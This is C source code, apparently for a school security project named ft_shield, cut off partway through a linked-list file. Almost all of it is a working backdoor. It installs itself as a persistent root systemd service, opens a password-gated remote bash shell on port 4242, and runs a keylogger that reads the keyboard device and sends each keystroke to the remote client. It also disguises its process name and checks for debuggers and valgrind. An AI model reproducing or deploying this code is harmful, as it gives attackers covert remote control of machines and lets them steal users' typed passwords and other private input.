/* FT_SHIELD.H */
# ifdef DEBUG
#  define ENABLE
# endif

# include <fcntl.h>
# include <libgen.h>
# include <limits.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <errno.h>
# include <unistd.h>
# include <arpa/inet.h>
// # include <bsd/string.h>
# include <linux/limits.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <sys/select.h>
# include <sys/un.h>
# include <sys/wait.h>
# include <sys/ioctl.h>
# include <linux/input.h>
# include <sys/stat.h>
# include <dirent.h>

#define DEST_PATH "/bin/ft_shield"
#define DEV_PATH "/dev/input"
#define MAX_EVENTS 3
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2
#define DEST_SERVICE "/etc/systemd/system/ft_shield.service"
#define LISTENING_PORT 4242
#define MAX_CONECTIONS 32 //because pipes may need more fds...
#define MAX_NBR_CLIENTS 2
#define READ_END 0
#define WRITE_END 1

#define TRIM_CHARS "\f\n\r\t\v "

#define HELP "\
---------------------------------\n\
?      - Shows help\n\
clear  - Clear terminal\n\
logon  - Spawns a keylogger in port 4242\n\
shell  - Spawn shell in port 4242\n\
nstats - Shows network stats\n\
---------------------------------\n\
"
#define REMOTE_OPENED "New remote shell opened in port 4242\n"
#define MANY_CLIENTS "Connection denied, too many clients\n"
#define CLEAR_CODE "\033[H\033[2J"

#define SERVICE "\
[Unit]\n\
Description=ft_shield service\n\
After=network.target\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart=/bin/ft_shield\n\
Restart=always\n\
RestartSec=5\n\
User=root\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n\
"

typedef struct s_list t_list;
typedef struct input_event t_event;

typedef enum e_status {
	HANDSHAKE,
	CONNECTED,
	SHELL,
	KEYLOGGER
} t_status;

typedef struct s_client {
	int			fd;
	t_status	status;
	char		*shell_code;
	char		*response_bffr;
	char		disconnect;
	size_t		inbytes; //client input bytes
	size_t		outbytes; //client output bytes
	int			inpipe_fd;
	int			outpipe_fd;
}	t_client;

typedef struct s_server {
	int			fd;
	int			nbr_clients;
	t_list		*pids;
	t_list		*passwords;
	t_client	clients[MAX_CONECTIONS];
	size_t		total_outbytes;
	size_t		total_inbytes;
	fd_set		rfds;
	fd_set		wfds;
}	t_server;

int		handle_input(t_server *server, int index, char *buffer);
void	handle_handshake(t_server *server, int index, char *input);
int		handle_commands(t_server *server, int index, char *input);
void	delete_client(t_server *server, int index);
int		extract_outpipe(t_server *server, int index);

/* shell.c */
// void	*shell_function(void *data);
int	shell_function(t_server *server, int index);

/* keylogger.c */
int	keylogger_function(t_server *server, int index);

/* keylogger_utils.c */
int hasEventTypes(int fd, unsigned long evbit_to_check);
int hasKeys(int fd);
int hasRelativeMovement(int fd);
int hasAbsoluteMovement(int fd);
int hasSpecificKeys(int fd, int *keys, size_t num_keys);
int keyboardFound(char *path, int *keyboard_fd);

/* stealth.c */
int	is_valgrind_running();
int	is_debugger_attached();

/* service.c */
void	create_service(void);
void	start_service(void);

/* server.c */
void	create_server_socket(t_server *s);
void	ft_server(t_server *server);

int	find_own_path(char *buffer, size_t size_buffer);

/* utils/utils.c */
char	*ft_strnstr(const char *haystack, const char *needle, size_t len);
char	*ft_strtrim(char const *s1, char const *set);
void	simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);
char	*gen_random_password(void);

void	ft_dprintf(int fd, const char *format, ...);
void	ft_perror(char *str);

char	*ft_strdup(const char *s1);
void	add2buffer(t_client *client, char *str);

typedef struct s_list
{
	void			*content;
	struct s_list	*next;
}	t_list;

t_list	*ft_lstnew(void *content);
t_list	*ft_lstlast(t_list *lst);
void	ft_lstadd_back(t_list **lst, t_list *new_node);
bool	shell_was_closed(t_list *node);
void	ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));
void	ft_lstdelone(t_list *lst, void (*del)(void *));
void	ft_lstclear(t_list **lst, void (*del)(void *));
void	hide_process_name(char **argv);

/*--------------------------------------*/

/* KEYLOGER_UTILS.C */
int hasEventTypes(int fd, unsigned long evbit_to_check)
{
	unsigned long evbit = 0;

	ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

	return ((evbit & evbit_to_check) == evbit_to_check);
}

int hasKeys(int fd)
{
	return hasEventTypes(fd, (1 << EV_KEY));
}

int hasRelativeMovement(int fd)
{
	return hasEventTypes(fd, (1 << EV_REL));
}

int hasAbsoluteMovement(int fd)
{
	return hasEventTypes(fd, (1 << EV_ABS));
}

int hasSpecificKeys(int fd, int *keys, size_t num_keys)
{

	size_t nchar = KEY_MAX / 8 + 1;
	unsigned char bits[nchar];

	ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);

	for (size_t i = 0; i < num_keys; ++i)
	{
		int key = keys[i];
		if (!(bits[key / 8] & (1 << (key % 8))))
			return 0;
	}
	return 1;
}

int keyboardFound(char *path, int *keyboard_fd)
{
	DIR *dir = opendir(path);
	if (dir == NULL)
		return 0;

	struct dirent *entry;
	while ((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		char filepath[320];
		snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
		struct stat file_stat;
		if (stat(filepath, &file_stat) == -1)
		{
			ft_perror("Error getting file information");
			continue;
		}

		if (S_ISDIR(file_stat.st_mode))
		{
			if (keyboardFound(filepath, keyboard_fd))
			{
				closedir(dir);
				return 1;
			}
		}
		else
		{
			int fd = open(filepath, O_RDONLY);
			int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
			if (!hasRelativeMovement(fd) && !hasAbsoluteMovement(fd) && hasKeys(fd) && hasSpecificKeys(fd, keys_to_check, 12))
			{
				printf("Keyboard found! File: \"%s\"\n", filepath);
				closedir(dir);
				*keyboard_fd = fd;
				return 1;
			}
			close(fd);
		}
	}

	closedir(dir);
	return 0;
}


/* KEYLOGER.C */
#include <linux/input.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/ioctl.h>

char *keycodes[247] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA",
                       "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "SCREENLOCK", "ROTATE_DISPLAY",
                       "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX"};
size_t event_size = sizeof(t_event);


#define KLG_HELP "Available commands:\n\
help: print this help\n\
exit: close keylogger\n"

static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
	int written;
	char str[256] = {0};
	for (size_t j = 0; j < to_write / event_size; j++)
		snprintf(str, 255, "Key: %s\n", keycodes[events[j].code]);
	written = write(fd, str, strlen(str));
	if (written < 0)
		return written;
	return 1;
}

void handle_klg_cmd(char *bfr) {
	if (!strncmp("help\n", bfr, strlen(bfr))) {
		printf(KLG_HELP);
	}
	if (!strncmp("exit\n", bfr, strlen(bfr))) {
		exit(0);
	}
}

int	keylogger_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;
	int			inpipe_fds[2], outpipe_fds[2];

	ft_dprintf(2, "clientfd: %d\n", client_fd);


	pipe(inpipe_fds);
	pipe(outpipe_fds);
	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here

	pid = fork();
	if (pid < 0) {
		ft_perror("fork");
	}
	else if (pid == 0) {
		setsid();

		close(server->fd);
		close(inpipe_fds[WRITE_END]);
		close(outpipe_fds[READ_END]);
		dup2(inpipe_fds[READ_END], STDIN_FILENO);
		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);
		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
		close(client_fd);
		int	kb;
		if (!keyboardFound(DEV_PATH, &kb)) {
			printf("couldn't open keyboard :(\n");
			exit(1);
		}

		t_event kbd_events[event_size * MAX_EVENTS];
		fd_set rset;
		
		int maxfd = kb;

		while (1)
		{
			fflush(stdout);
			FD_SET(STDIN_FILENO, &rset);
			FD_SET(kb, &rset);
			struct timeval tv = {.tv_sec = 0, .tv_usec = 5000};
			int retval = select(maxfd + 1, &rset, NULL, NULL, &tv);
			if (retval == -1) { ft_perror("select"); break; }
			if (FD_ISSET(kb, &rset)) {
				int r = read(kb, kbd_events, event_size * MAX_EVENTS);
				if (r < 0)
					break ;
				else
				{
					size_t j = 0;
					for (size_t i = 0; i < r / event_size; i++) //for each event read
					{
						if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..
							kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array
					}
					if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
						break ;
				}
			}
			if (FD_ISSET(STDIN_FILENO, &rset)) {
				char buffer[256];
				int r = read(STDIN_FILENO, buffer, 255);
				if (r <= 0)
					break ;
				buffer[r] = 0;
				handle_klg_cmd(buffer);
			}
		}
		close(STDOUT_FILENO);
		close(kb);
		exit(0);
	}
	else if (pid > 0) {
		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
	}
	return (1);
}


/* HANDLERS.C */
bool	search_password(t_server *server, char *input)
{
	t_list	*lst = server->passwords;
	t_list	*prev = NULL;

	while (lst)
	{
		if (strcmp(lst->content, input) == 0)
		{
			if (prev == NULL)
				server->passwords = lst->next;
			else
				prev->next = lst->next;
			ft_dprintf(2, "password [%s] found and deleted\n", input);
			free(lst->content);
			free(lst);
			return (true);
		}
		prev = lst;
		lst = lst->next;
	}
	return (false);
}

bool	check_server_password(t_server *server, char *input)
{
	const char	*server_pass = "E4F47C78F4E89C24DC38907008A4284C";
	char		input_hash[33];

	(void)server;
	simple_deterministic_id((uint8_t *)input, strlen(input), input_hash);
	ft_dprintf(2, "input: [%s] hash: [%s]\n", input, input_hash);
	if (strcmp(server_pass, input_hash) == 0)
	{
		ft_dprintf(2, "password match\n");
		return (true);
	}
	return (false);
}

void	handle_handshake(t_server *server, int index, char *input) {
	t_client *const	client = &server->clients[index];

	if (client->status == HANDSHAKE)
	{
		ft_dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
		if (search_password(server, input) == true)
		{
			shell_function(server, index);
			client->status = SHELL;
			return ;
		}
		if (check_server_password(server, input) == false)
		{
			ft_dprintf(2, "Invalid KEY\n");
			return ;
		}
		ft_dprintf(2, "Valid KEY\n");
		client->status = CONNECTED;
		add2buffer(&server->clients[index], strdup("$> "));
	}
}

void	add_password(t_server *server, int index)
{
	char		*password = gen_random_password();
	t_list		*new_node = ft_lstnew(password);
	char		msg_connection[300] = {0};

	ft_lstadd_back(&server->passwords, new_node);
	sprintf(msg_connection, "To access the remote shell, use the next Keycode -> [%s]\n", password);
	add2buffer(&server->clients[index], strdup(msg_connection));
}

void	delete_client(t_server *server, int index)
{
	t_client *client = &server->clients[index];

	close(client->fd);
	if (client->inpipe_fd && client->outpipe_fd) {
		close(client->inpipe_fd);
		close(client->outpipe_fd);
	}
	memset(&server->clients[index], 0, sizeof(t_client));
	server->nbr_clients--;
}

void	nstats(t_server *s, int index)
{
	char		msg[300] = {0};

	sprintf(msg, "Total inbytes: %ld\nTotal outbytes: %ld\nSession inbytes: %ld\nSession outbytes: %ld\n\n",
		s->total_inbytes, s->total_outbytes, s->clients[index].inbytes, s->clients[index].outbytes );
	add2buffer(&s->clients[index], strdup(msg));
}

int	handle_commands(t_server *server, int index, char *input)
{
	t_client	*client = &server->clients[index];

	if (strcmp("clear", input) == 0)
	{
		add2buffer(&server->clients[index], strdup(CLEAR_CODE));
	}
	else if (strcmp("shell", input) == 0)
	{
		ft_dprintf(2, "client_fd: %d\n", client->fd);
		add_password(server, index);
		client->disconnect = true;
		//delete_client(server, index);
	}
	else if (strcmp("logon", input) == 0)
	{
		client->status = KEYLOGGER;
		keylogger_function(server, index);
		return (0);
	}
	else if (strcmp("nstats", input) == 0)
	{
		nstats(server, index);
	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		add2buffer(&server->clients[index], strdup(HELP));
	}
	add2buffer(client, strdup("$> "));
	return (0);
}

int	handle_inpipe(t_server *server, int index, char *input)
{
	t_client	*client = &server->clients[index];
	//printf("trying to write inpipe, fdisset %i\n", FD_ISSET(client->inpipe_fd, &server->wfds));
	if (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->wfds))
	{
		//printf("writing inpipe!\n");
		int r = write(client->inpipe_fd, input, strlen(input));
		if (r < 0) {
			close(client->inpipe_fd);
			client->inpipe_fd = 0;
			close(client->outpipe_fd);
			client->outpipe_fd = 0;
			client->status = CONNECTED;
			client->response_bffr = strdup("$> ");
		}
	}
	return 0;
}

int	extract_outpipe(t_server *server, int index)
{
	char buffer[4096];

	memset(buffer, 0, sizeof(buffer));
	int			r = 0;
	t_client	*client = &server->clients[index];
	//printf("trying to read outpipe %i, fdisset %i\n", client->outpipe_fd, FD_ISSET(client->outpipe_fd, &server->rfds));
	if (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))
	{
		r = read(client->outpipe_fd, buffer, 4095);
		//printf("reading outpipe! (bytes: %i)\n", r);
		if (r == 0) {
			close(client->inpipe_fd);
			client->inpipe_fd = 0;
			close(client->outpipe_fd);
			client->outpipe_fd = 0;
			client->status = CONNECTED;
			client->response_bffr = strdup("$> ");
		}
		if (r > 0)
		{
			client->response_bffr = calloc(r + 1, 1);
			memcpy(client->response_bffr, buffer, r);
		}
		if (r < 0)
			client->response_bffr = strdup("errooooor\n");
	}
	return r;
}

int	handle_input(t_server *server, int index, char *buffer)
{
	const t_client	*client = &server->clients[index];
	char			*input = ft_strtrim(buffer, TRIM_CHARS);
	int				fd;

	ft_dprintf(2, "readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(server, index, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(server, index, input);
	else if (client->status == SHELL || client->status == KEYLOGGER)
		fd = handle_inpipe(server, index, buffer);
	free(input);
	return (fd);
}


/* SERVER.C */
void	create_server_socket(t_server *server)
{
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_fd == -1)
	{
		ft_perror("socket");
		exit(EXIT_FAILURE);
	}

	int reuse = 1;
	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse, sizeof(reuse)) < 0)
	{
		ft_perror("setsockopt(SO_REUSEADDR)");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in server_addr;

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(LISTENING_PORT);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
	{
		ft_perror("bind");
		exit(EXIT_FAILURE);
	}

	if (listen(socket_fd, MAX_CONECTIONS) == -1)
	{
		ft_perror("listen");
		exit(EXIT_FAILURE);
	}
	server->fd = socket_fd;
}


int	set_rw_fdset(t_client *clients, fd_set *rset, fd_set *wset, int server_fd)
{
	FD_ZERO(rset);
	FD_ZERO(wset);
	FD_SET(server_fd, rset);

	int max_fd = server_fd;
	for (int fd = 0; fd < MAX_CONECTIONS; ++fd)
	{
		if (clients[fd].fd)
		{
			FD_SET(clients[fd].fd, rset);
			FD_SET(clients[fd].fd, wset);
			if (clients[fd].fd > max_fd)
				max_fd = clients[fd].fd;
			if (clients[fd].inpipe_fd && clients[fd].outpipe_fd)
			{
				FD_SET(clients[fd].inpipe_fd, wset);
				FD_SET(clients[fd].outpipe_fd, rset);
				if (clients[fd].inpipe_fd > max_fd)
					max_fd = clients[fd].inpipe_fd;
				if (clients[fd].outpipe_fd > max_fd)
					max_fd = clients[fd].outpipe_fd;
			}
		}
	}
	return (max_fd);
}

void server_loop(t_server *s)
{
	t_client			*clients = s->clients;
	
	struct sockaddr_in	address;
	int					addrlen = sizeof(address);

	while (1)
	{
		struct timeval tv = {.tv_sec = 1, .tv_usec = 0};
		
		int max_fd = set_rw_fdset(clients, &s->rfds, &s->wfds, s->fd);

		int retval = select(max_fd + 1, &s->rfds, &s->wfds, NULL, &tv);
		if (retval == -1)
			ft_perror("select");
		else if (retval != 0)
		{
			if (FD_ISSET(s->fd, &s->rfds))
			{
				int	client_fd;
				if ((client_fd = accept(s->fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)
				{
					ft_perror("accept");
					continue;
				}
				if (s->nbr_clients == MAX_NBR_CLIENTS)
				{
					send(client_fd, MANY_CLIENTS, sizeof(MANY_CLIENTS), 0);
					ft_dprintf(2, "Connection denied, too many clients\n");
					close(client_fd);
					continue;
				}

				char client_ip[200] = {0};
				inet_ntop(AF_INET, &address.sin_addr, client_ip, INET_ADDRSTRLEN);
				int client_port = ntohs(address.sin_port);

				ft_dprintf(2, "Accepted connection from %s:%d\n", client_ip, client_port);
				s->nbr_clients++;
				clients[client_fd].fd = client_fd;
				ft_dprintf(2, "New client accepted %d\n", client_fd);
				if (clients[client_fd].status == HANDSHAKE)
					send(client_fd, "Keycode: ", 10, 0);
			}

			for (int fd = 0; fd <= max_fd; ++fd)
			{
				int c_fd = clients[fd].fd;
				if (c_fd && FD_ISSET(c_fd, &s->rfds))
				{

					char buffer[1024] = {0};

					int rb = read(c_fd, buffer, sizeof(buffer) - 1);
					if (rb < 0)
					{
						ft_perror("recv");
						continue;
					}
					else if (rb == 0)
					{
						ft_dprintf(2, "Connection closed %d (recv)\n", c_fd);
						close(c_fd);
						if (clients[fd].outpipe_fd)
						{
							close(clients[fd].outpipe_fd);
							close(clients[fd].inpipe_fd);
						}
						memset(&clients[fd], 0, sizeof(t_client));
						s->nbr_clients--;
						continue;
					}
					else
					{
						s->total_inbytes += rb;
						clients[fd].inbytes += rb;
						handle_input(s, fd, buffer);
					}
					if (clients[fd].status == HANDSHAKE)
						add2buffer(&clients[fd], strdup("Keycode: "));
				}
				if (c_fd && FD_ISSET(c_fd, &s->wfds)) {
					int rpipe = 0;
					if (clients[fd].outpipe_fd) {
						rpipe = extract_outpipe(s, fd);
					}
					if (clients[fd].response_bffr) {
						int sb;
						if (rpipe > 0) {
							sb = write(c_fd,
								clients[fd].response_bffr,
								rpipe);
						} else {
							sb = write(c_fd,
								clients[fd].response_bffr,
								strlen(clients[fd].response_bffr));
						}
						if (sb < 0)
						{
							ft_perror("recv");
							continue;
						}
						else if (sb == 0)
						{
							ft_dprintf(2, "Connection closed %d (write)\nBuffer: (%s)\n", c_fd, clients[fd].response_bffr);
							close(c_fd);
							if (clients[fd].outpipe_fd)
							{
								close(clients[fd].outpipe_fd);
								close(clients[fd].inpipe_fd);
							}
							free(clients[fd].response_bffr);
							memset(&clients[fd], 0, sizeof(t_client));
							s->nbr_clients--;
							continue;
						}
						s->total_outbytes += sb;
						free(clients[fd].response_bffr);
						clients[fd].outbytes += sb;
						clients[fd].response_bffr = NULL;
						if (clients[fd].disconnect) {
							delete_client(s, fd);
						}
					}
				}
			}
		}
		else
		{
			t_list *aux = s->passwords;
			int i = 0;
			while (aux)
			{
				ft_dprintf(2, "password %d - %s\n", i, (char *)aux->content);
				i++;
				aux = aux->next;
			}
			ft_delete_node_if_true(s, &s->pids, shell_was_closed);
		}
	}
}

void	ft_server(t_server *server)
{
	create_server_socket(server);
	server_loop(server);
}


/* SERVICE.C */
void	create_service(void)
{
	ft_dprintf(2, "creating service\n");
	int	fd_config = open(DEST_SERVICE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd_config == -1) {
		ft_perror(DEST_SERVICE);
		exit(1);
	}
	int ret_write = write(fd_config, SERVICE, sizeof(SERVICE));
	if (ret_write == -1 || ret_write != sizeof(SERVICE)) {
		ft_perror("service");
	}
	close(fd_config);
}

void	start_service(void)
{
	ft_dprintf(2, "starting service\n");
	system("sudo systemctl daemon-reload");
	system("sudo systemctl enable ft_shield.service");
	system("sudo systemctl start ft_shield.service");
}


/* SHELL.C */
#include <fcntl.h>
#include <sys/ioctl.h>

int	shell_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;
	int			inpipe_fds[2], outpipe_fds[2];

	ft_dprintf(2, "clientfd: %d\n", client_fd);

	pipe(inpipe_fds);
	pipe(outpipe_fds);
	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here
	
	pid = fork();
	if (pid < 0) {
		ft_perror("fork");

	}
	else if (pid == 0) {
		setsid();
		
		close(server->fd);
		close(inpipe_fds[WRITE_END]);
		close(outpipe_fds[READ_END]);
		dup2(inpipe_fds[READ_END], STDIN_FILENO);
		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);
		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
		close(client_fd);

		char *args[] = {"PyS <3 - Shell", "-i", NULL};
		setenv("TERM", "xterm-256color", 1);
		execv("/bin/bash", args);
		exit(1);
	}
	else if (pid > 0) {
		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
	}
	return (1);
}


/* STEALTH.C */
int	is_debugger_attached()
{
	FILE *file = fopen("/proc/self/status", "r");

	if (file == NULL) {
		ft_perror("/proc/self/status");
		return (1);
	}

	while (1) {
		char line[256] = {0};

		if (fgets(line, sizeof(line), file) == NULL)
			break;
		if (strstr(line, "TracerPid:")) {
			int pid = atoi(line + 10);
			if (pid != 0) {
				ft_dprintf(2, "Error: running inside a debugger\n");
				fclose(file);
				return (1);
			}
			break;
		}
	}

	fclose(file);
	return (0);
}

int	is_valgrind_running()
{
	FILE *file = fopen("/proc/self/maps", "r");

	if (file == NULL) {
		ft_perror("/proc/self/maps");
		return (1);
	}

	while (1) {
		char line[256] = {0};

		if (fgets(line, sizeof(line), file) == NULL)
			break;
		if (strstr(line, "valgrind")) {
			ft_dprintf(2, "Running on valgrind\n");
			fclose(file);
			return (1);
		}
	}

	fclose(file);
	return (0);
}

void	hide_process_name(char **argv)
{
	size_t len = strlen(argv[0]);
	memset(argv[0], 0, len);
	strncpy(argv[0], "PyS <3", len - 1);
}


/* PRINTS.C */
#ifdef ENABLE
# include <stdarg.h>
# include <time.h>
#endif

void ft_dprintf(int fd, const char *format, ...)
{
	#ifdef ENABLE
		time_t now = time(NULL);
		struct tm *t = localtime(&now);
		dprintf(fd, "[%02d:%02d:%02d] ", t->tm_hour, t->tm_min, t->tm_sec);
		
		va_list args;
		va_start(args, format);
		vdprintf(fd, format, args);
		va_end(args);
	#else
		(void)fd, (void)format;
	#endif
}

void ft_perror(char *str)
{
	#ifdef ENABLE
		time_t now = time(NULL);
		struct tm *t = localtime(&now);
		dprintf(2, "[%02d:%02d:%02d] ", t->tm_hour, t->tm_min, t->tm_sec);
		perror(str);
	#else
		(void)str;
	#endif
}


/* UTILS.C */
char	*ft_strnstr(const char *haystack, const char *needle, size_t len)
{
	size_t	pos;
	size_t	i;

	if (!*needle)
		return ((char *)haystack);
	pos = 0;
	while (haystack[pos] && pos < len)
	{
		if (haystack[pos] == needle[0])
		{
			i = 1;
			while (needle[i] && haystack[pos + i] == needle[i]
				&& (pos + i) < len)
				++i;
			if (needle[i] == '\0')
				return ((char *)&haystack[pos]);
		}
		++pos;
	}
	return (NULL);
}

size_t	ft_strlcpy(char *dest, const char *src, size_t size)
{
	size_t	i;

	if (size == 0)
		return (strlen(src));
	i = 0;
	if (size != 0)
	{
		while (src[i] != '\0' && i < (size -1))
		{
			dest[i] = src[i];
			i++;
		}
		dest[i] = '\0';
	}
	return (strlen(src));
}

char	*ft_strtrim(char const *s1, char const *set)
{
	char	*final;
	size_t	i;
	size_t	size;

	final = NULL;
	if (s1 != NULL && set != NULL)
	{
		i = 0;
		size = strlen(s1);
		while (s1[i] && strchr(set, s1[i]))
			i++;
		while (s1[size -1] && strrchr(set, s1[size -1]) && size > i)
			size--;
		final = calloc((size - i + 1), sizeof(char));
		if (final == NULL)
			return (NULL);
		ft_strlcpy(final, &s1[i], size - i + 1);
	}
	return (final);
}

#define FIXED_OUTPUT_SIZE 16
#define HEX_OUTPUT_SIZE ((FIXED_OUTPUT_SIZE * 2) + 1)

void simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output)
{
	uint8_t buffer[FIXED_OUTPUT_SIZE] = {0};
	
	for (size_t i = 0; i < input_len; i++)
	{
		for (size_t j = 0; j < FIXED_OUTPUT_SIZE; j++)
		{
			buffer[j] ^= input_data[i] + (i * j * 17);
			buffer[j] = (buffer[j] * 13) % 256;
		}
	}

	for (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)
	{
		buffer[i] ^= buffer[(i + 5) % FIXED_OUTPUT_SIZE];
		buffer[i] += buffer[(i + 11) % FIXED_OUTPUT_SIZE];
	}

	for (size_t i = 0; i < FIXED_OUTPUT_SIZE; i++)
		sprintf(output + (i * 2), "%02X", buffer[i]);
	output[HEX_OUTPUT_SIZE - 1] = '\0';
}

char	*gen_random_password(void)
{
	uint8_t input[64];

	int fd = open("/dev/urandom", O_RDONLY);
	int ret_read = read(fd, input, 64);

	if (ret_read <= 0)
		return (NULL);
	char *password = calloc(HEX_OUTPUT_SIZE, sizeof(char));

	simple_deterministic_id(input, ret_read, password);
	close(fd);
	return (password);
}

static char	*ft_strjoin(char const *s1, char const *s2)
{
	size_t	s1len;
	size_t	s2len;
	char	*res;
	size_t	pos;

	s1len = strlen(s1);
	s2len = strlen(s2);
	res = malloc(s1len + s2len + 1);
	if (res == (void *) 0)
		return (res);
	pos = 0;
	while (pos < s1len)
	{
		res[pos] = s1[pos];
		++pos;
	}
	pos = 0;
	while (pos <= s2len)
	{
		res[pos + s1len] = s2[pos];
		++pos;
	}
	return (res);
}

void	add2buffer(t_client *client, char *str) {
	if (!client->response_bffr) {
		client->response_bffr = str;
		return ;
	}
	char *new = ft_strjoin(client->response_bffr, str);
	free(str);
	free(client->response_bffr);
	client->response_bffr = new;
}

/* LST.C */
t_list	*ft_lstnew(void *content)
{
	t_list *lst = calloc(1, sizeof(t_list));

	if (lst == NULL)
		return (NULL);
	lst->content = content;
	return (lst);
}

t_list	*ft_lstlast(t_list *lst)
{
